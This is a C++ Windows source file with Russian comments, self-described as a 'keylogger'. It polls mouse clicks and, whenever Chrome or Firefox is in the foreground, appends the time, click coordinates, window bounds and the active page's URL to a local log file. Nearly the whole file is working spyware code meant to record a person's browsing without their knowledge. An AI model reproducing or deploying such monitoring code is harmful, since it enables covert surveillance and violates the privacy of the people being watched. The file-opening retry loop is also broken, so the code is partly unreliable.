// ConsoleApplication5.cpp: определяет точку входа для консольного приложения.
// кейлогер , который при клике пишет в файл время, координаты клика и данные из окна chrome

#include "stdafx.h"
#include "atltypes.h"
#include "atlstr.h"
#include <iostream>
#include <string>
#include <psapi.h>
#include <commdlg.h>
#include <fstream>
#include <time.h>
#include "Header.h"

using namespace std;

string get_time_now()
{
	/*
	 * Текущее время(вплоть до секунд)
	 */
	struct tm newtime;
	char am_pm[] = "AM";
	time_t long_time;
	char timebuf[26];
	errno_t err;

	time(&long_time);
	// Convert to local time.  
	err = localtime_s(&newtime, &long_time);
	if (err)
	{
		printf("Invalid argument to _localtime64_s.");
		exit(1);
	}
	string s = to_string(newtime.tm_mday) + "." + to_string(newtime.tm_mon) + "." + to_string(1900 + newtime.tm_year) + "\t";
	// Convert to an ASCII representation.   
	err = asctime_s(timebuf, 26, &newtime);
	if (err)
	{
		printf("Invalid argument to asctime_s.");
		exit(1);
	}
	s += string(timebuf).substr(11, 8) + "\t";
	return s;
}

void keylogger(ofstream &file)
{
	/* 
	 * кейлоггер 
	 */
	tm* ptr;
	time_t seconds;
	int i;
	CPoint pt;
	CRect rect;
	HWND hWnd;
	string str;
	for (i = 1; i < 200; i++)
	{
		Sleep(100);
		if ((GetAsyncKeyState(VK_LBUTTON) != 0) || (GetAsyncKeyState(VK_RBUTTON) != 0) || (GetAsyncKeyState(VK_MBUTTON) != 0))
		{
			GetCursorPos(&pt);
			hWnd = GetForegroundWindow();
			GetWindowRect(hWnd, &rect);
			str = get_active_window();
			if ((str.find("chrome") != string::npos) || (str.find("firefox") != string::npos))
			{
				file << get_time_now(); // дата
				// курсор
				file << "(" << pt.x  << ";" << pt.y << ")\t";
				// координаты активного окна
				file << "[(" << rect.left << ";" << rect.top << ");(" << rect.left+rect.Width() << ";" << rect.top + rect.Height() << ")]\t";
				// url активного окна
				file << get_url(str) << endl;
			}
		}
	}
}

int main()
{
	setlocale(LC_ALL, "rus");
	ofstream log_file("1.txt", std::ios_base::app);		// на дозапись
	while (!log_file.is_open())
		ofstream log_file("1.txt");
	keylogger(log_file);
	log_file.close();
	return 0;
}
